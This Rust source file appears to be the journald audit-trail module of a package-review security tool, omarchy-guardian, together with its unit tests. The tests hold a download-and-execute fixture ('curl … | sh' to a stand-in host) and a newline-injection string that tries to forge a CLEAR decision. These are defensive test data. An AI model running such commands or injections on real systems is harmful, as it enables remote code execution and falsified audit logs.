//! The audit trail: one entry in the system journal for everything Guardian
//! decided, so that what was installed past which verdict can be told
//! afterwards.
//!
//! The journal is the one place a program running as the user can add to
//! and cannot rewrite: journald keeps the entries, and stamps each with the
//! user id of the process that sent it (`_UID`) itself. Guardian's reviews
//! run as the invoking user, so their entries carry that user's id, and any
//! program running as that user can write one that looks the same: what an
//! entry proves is who could have written it, and that nobody changed it
//! since. Entries written by Guardian's root halves (the pacman hook's
//! result, a permit, the sweep's allow list) carry `_UID=0`, which no user
//! process can.
//!
//! Entries are sent with `logger --journald`, by absolute path and under a
//! timeout. A record that cannot be written never changes a decision: it is
//! said once on stderr. Nothing from the reviewed content goes in except
//! names (package names, paths, rule ids), each as one bounded, printable
//! line; no file content, no excerpts, no addresses, no summaries.

pub mod log;

use std::fmt::Write as _;
#[cfg(not(test))]
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};

use crate::config::model::{Named, SourceClass};
use crate::report::{Decision, Report};
use crate::text::shown;
#[cfg(not(test))]
use crate::tools::{self, Limits};

/// The journal identifier of every entry: `journalctl -t omarchy-guardian`.
pub const IDENTIFIER: &str = "omarchy-guardian";
#[cfg(not(test))]
const LOGGER: &str = "/usr/bin/logger";
/// The most characters one field holds; the rest is cut, visibly.
const MAX_VALUE_CHARS: usize = 32 * 1024;
/// Set by the test harnesses (see `notify`): their entries are marked, not
/// left out, so the variable cannot be used to hide an install.
const HARNESS: &str = "OMARCHY_GUARDIAN_NO_NOTIFY";

pub const EVENT: &str = "GUARDIAN_EVENT";
pub const GATE: &str = "GUARDIAN_GATE";
pub const CLASS: &str = "GUARDIAN_CLASS";
pub const SUBJECT: &str = "GUARDIAN_SUBJECT";
pub const DIGEST: &str = "GUARDIAN_DIGEST";
pub const DECISION: &str = "GUARDIAN_DECISION";
pub const EXIT: &str = "GUARDIAN_EXIT";
pub const FINDINGS: &str = "GUARDIAN_FINDINGS";
pub const AI: &str = "GUARDIAN_AI";
pub const PROFILE: &str = "GUARDIAN_PROFILE";
pub const VERSION: &str = "GUARDIAN_VERSION";
/// The permit that let a blocked review through.
pub const PERMIT: &str = "GUARDIAN_PERMIT";
/// The decision a permit overruled.
pub const OVERRULED: &str = "GUARDIAN_OVERRULED";
/// The permit a block offered (`omarchy-guardian permit <ID>`).
pub const OFFERED: &str = "GUARDIAN_OFFERED";
/// The user a root half acted for.
pub const FOR_UID: &str = "GUARDIAN_FOR_UID";
/// What a gate or setting was before a change.
pub const FROM: &str = "GUARDIAN_FROM";
/// New or changed items a scheduled sweep found.
pub const CHANGES: &str = "GUARDIAN_CHANGES";
/// When a permit ends, in seconds since the epoch.
pub const EXPIRES: &str = "GUARDIAN_EXPIRES";
/// Written under a test harness.
pub const TEST: &str = "GUARDIAN_TEST";

/// What kind of thing an entry records.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Event {
    /// A gate's decision on what it reviewed.
    Review,
    /// A permit granted, used or revoked.
    Permit,
    /// A gate turned on or off.
    Gate,
    /// The system settings file saved, or weaker settings accepted.
    Settings,
    /// The sweep's list of allowed items changed.
    Allow,
    /// Review memory forgotten.
    Forget,
    /// How a scheduled sweep ended.
    Sweep,
}

impl Event {
    pub const ALL: [Self; 7] = [
        Self::Review,
        Self::Permit,
        Self::Gate,
        Self::Settings,
        Self::Allow,
        Self::Forget,
        Self::Sweep,
    ];

    pub const fn name(self) -> &'static str {
        match self {
            Self::Review => "review",
            Self::Permit => "permit",
            Self::Gate => "gate",
            Self::Settings => "settings",
            Self::Allow => "allow",
            Self::Forget => "forget",
            Self::Sweep => "sweep",
        }
    }
}

/// The gate an entry is about.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Gate {
    Pacman,
    Aur,
    Theme,
    Plugin,
    Guard,
    Sandbox,
    Scan,
    Sweep,
}

impl Gate {
    const ALL: [Self; 8] = [
        Self::Pacman,
        Self::Aur,
        Self::Theme,
        Self::Plugin,
        Self::Guard,
        Self::Sandbox,
        Self::Scan,
        Self::Sweep,
    ];

    pub const fn name(self) -> &'static str {
        match self {
            Self::Pacman => "pacman",
            Self::Aur => "aur",
            Self::Theme => "theme",
            Self::Plugin => "plugin",
            Self::Guard => "guard",
            Self::Sandbox => "sandbox",
            Self::Scan => "scan",
            Self::Sweep => "sweep",
        }
    }

    pub fn parse(text: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|gate| gate.name() == text)
    }

    /// The gate a `guard` of `class` is: the theme and plugin commands go
    /// through `guard`, and are told by the class they pass.
    pub const fn of_guard(class: SourceClass) -> Self {
        match class {
            SourceClass::Theme => Self::Theme,
            SourceClass::Plugin => Self::Plugin,
            _ => Self::Guard,
        }
    }
}

/// One journal entry, built field by field.
#[derive(Clone, Debug)]
pub struct Entry {
    event: Event,
    fields: Vec<(&'static str, String)>,
}

/// `text` with every address cut down to its scheme and host: a path or a
/// query may hold a token, and neither belongs in a log.
fn without_address_paths(text: &str) -> String {
    let words: Vec<String> = text
        .split(' ')
        .map(|word| {
            let Some((scheme, rest)) = word.split_once("://") else {
                return word.to_string();
            };
            let host = rest.split(['/', '?', '#']).next().unwrap_or_default();
            let host = host.rsplit('@').next().unwrap_or(host);
            if host.len() == rest.len() {
                format!("{scheme}://{host}")
            } else {
                format!("{scheme}://{host}/…")
            }
        })
        .collect();
    words.join(" ")
}

/// One line of printable text of bounded length: what a field may hold of
/// a name that came from reviewed content.
fn single_line(value: &str) -> String {
    let value = without_address_paths(value.trim());
    let shown = shown(&value);
    if shown.chars().count() <= MAX_VALUE_CHARS {
        return shown.into_owned();
    }
    let mut cut: String = shown.chars().take(MAX_VALUE_CHARS).collect();
    cut.push_str(" …(cut)");
    cut
}

impl Entry {
    pub fn new(event: Event) -> Self {
        Self {
            event,
            fields: Vec::new(),
        }
    }

    /// Adds `field` unless `value` is empty.
    #[must_use]
    pub fn with(mut self, field: &'static str, value: impl AsRef<str>) -> Self {
        let value = single_line(value.as_ref());
        if !value.is_empty() {
            self.fields.retain(|(known, _)| *known != field);
            self.fields.push((field, value));
        }
        self
    }

    #[must_use]
    pub fn gate(self, gate: Gate) -> Self {
        self.with(GATE, gate.name())
    }

    /// The decision's name and the exit code it stands for.
    #[must_use]
    pub fn decision(self, name: &str, exit: u8) -> Self {
        self.with(DECISION, name).with(EXIT, exit.to_string())
    }

    /// What a review found, from its report: counts and rule ids, the AI
    /// runs in numbers, and the profile.
    #[must_use]
    pub fn report(self, report: &Report) -> Self {
        self.with(FINDINGS, report.audit_findings())
            .with(AI, report.audit_ai())
            .with(PROFILE, &report.profile)
    }

    fn value(&self, field: &str) -> &str {
        self.fields
            .iter()
            .find(|(known, _)| *known == field)
            .map_or("", |(_, value)| value.as_str())
    }

    /// The line `journalctl` shows without asking for fields.
    fn message(&self) -> String {
        let mut message = self.event.name().to_string();
        for field in [GATE, DECISION, SUBJECT] {
            let value = self.value(field);
            if !value.is_empty() {
                let _ = write!(message, " {}", value.chars().take(300).collect::<String>());
            }
        }
        let permit = self.value(PERMIT);
        if !permit.is_empty() {
            let _ = write!(message, " (permit {permit})");
        }
        message
    }

    /// The entry as `logger --journald` reads it: one `FIELD=value` a line.
    fn render(&self) -> String {
        let blocked = !matches!(self.value(EXIT), "" | "0");
        let noteworthy = blocked || !self.value(PERMIT).is_empty() || self.event != Event::Review;
        let mut text = format!(
            "SYSLOG_IDENTIFIER={IDENTIFIER}\nPRIORITY={}\nMESSAGE={}\n{EVENT}={}\n{VERSION}={}\n",
            if noteworthy { 5 } else { 6 },
            self.message(),
            self.event.name(),
            env!("CARGO_PKG_VERSION"),
        );
        for (field, value) in &self.fields {
            let _ = writeln!(text, "{field}={value}");
        }
        if std::env::var_os(HARNESS).is_some() {
            let _ = writeln!(text, "{TEST}=1");
        }
        text
    }

    /// Writes the entry to the journal. A failure is said once and changes
    /// nothing else.
    pub fn record(self) {
        static WARNED: AtomicBool = AtomicBool::new(false);
        if let Err(reason) = send(&self.render())
            && !WARNED.swap(true, Ordering::Relaxed)
        {
            errln!(
                "omarchy-guardian: this could not be recorded in the system journal ({reason}); `omarchy-guardian log` will not show it."
            );
        }
    }
}

#[cfg(not(test))]
fn send(text: &str) -> Result<(), String> {
    tools::run(
        Path::new(LOGGER),
        &["--journald".into()],
        Some(text.as_bytes()),
        &[],
        Limits {
            timeout_secs: 5,
            max_output: 4096,
        },
    )
    .and_then(tools::Captured::into_success)
    .map(drop)
    .map_err(|error| error.to_string())
}

/// Under test nothing reaches the journal: the entries are kept for the
/// test that wrote them, unless that test has the journal refuse them.
#[cfg(test)]
fn send(text: &str) -> Result<(), String> {
    if REFUSING.with(std::cell::Cell::get) {
        return Err("no journal in this test".into());
    }
    SENT.with(|sent| sent.borrow_mut().push(text.to_string()));
    Ok(())
}

#[cfg(test)]
thread_local! {
    static SENT: std::cell::RefCell<Vec<String>> = const { std::cell::RefCell::new(Vec::new()) };
    static REFUSING: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
}

/// The entries this test thread wrote since it last asked.
#[cfg(test)]
pub fn taken() -> Vec<String> {
    SENT.with(|sent| std::mem::take(&mut *sent.borrow_mut()))
}

/// What a gate decided on a review, for `review`.
pub struct Reviewed<'a> {
    pub gate: Gate,
    /// The class, or classes, of what was reviewed.
    pub class: &'a str,
    pub subject: &'a str,
    /// The SHA-256 of what was reviewed (see docs/permits.md for each gate).
    pub digest: &'a str,
    pub decision: Decision,
    /// The permit that let it through, if one did.
    pub permit: Option<&'a str>,
    /// The permit the block offered, if it offered one.
    pub offered: Option<&'a str>,
    pub exit: u8,
}

/// The entry for a gate's decision on `report`.
pub fn review(reviewed: &Reviewed<'_>, report: &Report) -> Entry {
    let name = if reviewed.permit.is_some() {
        "PERMITTED"
    } else {
        report.decision_name(reviewed.decision)
    };
    let mut entry = Entry::new(Event::Review)
        .gate(reviewed.gate)
        .with(CLASS, reviewed.class)
        .with(SUBJECT, reviewed.subject)
        .with(DIGEST, reviewed.digest)
        .decision(name, reviewed.exit)
        .report(report);
    if let Some(permit) = reviewed.permit {
        entry = entry
            .with(PERMIT, permit)
            .with(OVERRULED, report.decision_name(reviewed.decision));
    }
    if let Some(offered) = reviewed.offered {
        entry = entry.with(OFFERED, offered);
    }
    entry
}

/// A gate refused before, or without, a review it could decide on.
pub fn refused(gate: Gate, subject: &str, exit: u8) {
    Entry::new(Event::Review)
        .gate(gate)
        .with(SUBJECT, subject)
        .decision("REFUSED", exit)
        .record();
}

/// A gate or integration went from one state to another (`on`, `off`).
/// For the settings app and `protect`.
pub fn gate_changed(name: &str, from: &str, to: &str) {
    Entry::new(Event::Gate)
        .with(SUBJECT, name)
        .with(FROM, from)
        .with(DECISION, to)
        .record();
}

/// The system settings changed: `what` says how, in a few words.
pub fn settings_changed(what: &str) {
    Entry::new(Event::Settings)
        .with(SUBJECT, what)
        .with(DECISION, "SAVED")
        .record();
}

/// Review memory was forgotten: one identity, or everything.
pub fn forgot(what: &str) {
    Entry::new(Event::Forget)
        .with(SUBJECT, what)
        .with(DECISION, "FORGOTTEN")
        .record();
}

/// The sweep's list of allowed items was changed for user `uid`, by root:
/// `changes` are the changes asked for, without the fingerprints.
pub fn allow_list_changed(changes: &str, uid: Option<u32>) {
    Entry::new(Event::Allow)
        .gate(Gate::Sweep)
        .with(SUBJECT, changes)
        .with(DECISION, "CHANGED")
        .with(FOR_UID, uid.map(|uid| uid.to_string()).unwrap_or_default())
        .record();
}

/// How a scheduled sweep ended: the decision and counts, no names.
pub fn sweep_ended(report: &Report, decision: Decision, changes: usize) {
    Entry::new(Event::Sweep)
        .gate(Gate::Sweep)
        .with(CLASS, SourceClass::System.name())
        .decision(report.decision_name(decision), 0)
        .report(report)
        .with(CHANGES, changes.to_string())
        .record();
}

/// A scheduled sweep that could not run at all.
pub fn sweep_failed() {
    Entry::new(Event::Sweep)
        .gate(Gate::Sweep)
        .decision("FAILED", 2)
        .record();
}

#[cfg(test)]
mod tests {
    use super::{DIGEST, Entry, Event, Gate, Reviewed, SUBJECT, review, taken};
    use crate::report::{Blocked, Decision, Gap, LocalFinding, Report};
    use crate::rules::RuleId;

    fn field<'a>(entry: &'a str, name: &str) -> Option<&'a str> {
        entry
            .lines()
            .find_map(|line| line.strip_prefix(name)?.strip_prefix('='))
    }

    #[test]
    fn an_entry_is_one_field_a_line_whatever_a_name_holds() {
        taken();
        Entry::new(Event::Review)
            .gate(Gate::Guard)
            .with(
                SUBJECT,
                "theme:x\nGUARDIAN_DECISION=CLEAR\u{1b}[2J\rMESSAGE=forged",
            )
            .with(DIGEST, "")
            .decision("INCOMPLETE", 2)
            .record();
        let sent = taken();
        assert_eq!(sent.len(), 1);
        let entry = &sent[0];
        assert_eq!(field(entry, "SYSLOG_IDENTIFIER"), Some("omarchy-guardian"));
        assert_eq!(field(entry, "GUARDIAN_EVENT"), Some("review"));
        assert_eq!(field(entry, "GUARDIAN_GATE"), Some("guard"));
        assert_eq!(field(entry, "GUARDIAN_EXIT"), Some("2"));
        assert_eq!(
            field(entry, "GUARDIAN_VERSION"),
            Some(env!("CARGO_PKG_VERSION"))
        );
        // The name's own line breaks and escapes are codes inside its field:
        // the only decision and message lines are Guardian's.
        assert_eq!(field(entry, "GUARDIAN_DECISION"), Some("INCOMPLETE"));
        assert!(
            field(entry, "GUARDIAN_SUBJECT")
                .is_some_and(|subject| subject.contains("\\nGUARDIAN_DECISION=CLEAR\\u{1b}"))
        );
        assert_eq!(
            entry
                .lines()
                .filter(|line| line.starts_with("MESSAGE="))
                .count(),
            1
        );
        // An empty field is left out.
        assert_eq!(field(entry, "GUARDIAN_DIGEST"), None);
        assert!(!entry.contains('\u{1b}') && !entry.contains('\r'));
    }

    #[test]
    fn a_record_that_cannot_be_written_stops_nothing() {
        taken();
        super::REFUSING.with(|refusing| refusing.set(true));
        super::refused(Gate::Pacman, "x", 2);
        super::forgot("everything");
        super::REFUSING.with(|refusing| refusing.set(false));
        assert!(taken().is_empty());
        super::forgot("everything");
        assert_eq!(taken().len(), 1);
    }

    #[test]
    fn an_address_keeps_its_host_and_loses_the_rest() {
        let entry = Entry::new(Event::Review).with(
            SUBJECT,
            "remote package URLs are not supported: https://user:pw@x.example/a/b.pkg?token=abc and git+ssh://y.example",
        );
        assert_eq!(
            entry.value(SUBJECT),
            "remote package URLs are not supported: https://x.example/… and git+ssh://y.example"
        );
    }

    #[test]
    fn a_long_value_is_cut_and_says_so() {
        let entry = Entry::new(Event::Forget).with(SUBJECT, "x".repeat(100_000));
        let value = entry.value(SUBJECT);
        assert!(value.chars().count() < 33_000);
        assert!(value.ends_with("…(cut)"));
    }

    #[test]
    fn a_review_records_counts_and_rule_ids_and_no_content() {
        let mut report = Report::new("pacman transaction");
        report.profile = "standard".into();
        report.findings.push(LocalFinding {
            path: "demo/.INSTALL".into(),
            line: 3,
            rule: RuleId::DownloadAndExecute,
            excerpt: "curl https://secret.example/payload?token=abc | sh".into(),
        });
        report.gaps.push(Gap::NoReviewableFiles);
        let decision = Decision::Blocked(Blocked::Incomplete);
        let entry = review(
            &Reviewed {
                gate: Gate::Pacman,
                class: "local-package",
                subject: "demo-1.0-1-any",
                digest: "demo-1.0-1-any=abc",
                decision,
                permit: None,
                offered: Some("0123456789abcdef"),
                exit: 2,
            },
            &report,
        )
        .render();
        assert_eq!(field(&entry, "GUARDIAN_DECISION"), Some("INCOMPLETE"));
        assert_eq!(field(&entry, "GUARDIAN_OFFERED"), Some("0123456789abcdef"));
        assert_eq!(field(&entry, "GUARDIAN_PROFILE"), Some("standard"));
        let findings = field(&entry, "GUARDIAN_FINDINGS").unwrap();
        assert!(findings.contains("high=1"), "{findings}");
        assert!(
            findings.contains(RuleId::DownloadAndExecute.name()),
            "{findings}"
        );
        assert!(findings.contains("incomplete=1"), "{findings}");
        assert!(!entry.contains("secret.example") && !entry.contains("token"));
        assert!(entry.contains("PRIORITY=5"));

        // A permit names itself and what it overruled.
        let entry = review(
            &Reviewed {
                gate: Gate::Pacman,
                class: "local-package",
                subject: "demo-1.0-1-any",
                digest: "demo-1.0-1-any=abc",
                decision,
                permit: Some("0123456789abcdef"),
                offered: None,
                exit: 0,
            },
            &report,
        )
        .render();
        assert_eq!(field(&entry, "GUARDIAN_DECISION"), Some("PERMITTED"));
        assert_eq!(field(&entry, "GUARDIAN_OVERRULED"), Some("INCOMPLETE"));
        assert_eq!(field(&entry, "GUARDIAN_PERMIT"), Some("0123456789abcdef"));
        assert!(entry.contains("PRIORITY=5"));
    }

    #[test]
    fn gates_are_named_as_the_journal_names_them() {
        use crate::config::model::SourceClass;
        for gate in Gate::ALL {
            assert_eq!(Gate::parse(gate.name()), Some(gate));
        }
        assert_eq!(Gate::of_guard(SourceClass::Theme), Gate::Theme);
        assert_eq!(Gate::of_guard(SourceClass::Plugin), Gate::Plugin);
        assert_eq!(Gate::of_guard(SourceClass::Source), Gate::Guard);
        assert_eq!(Gate::parse("root"), None);
    }
}
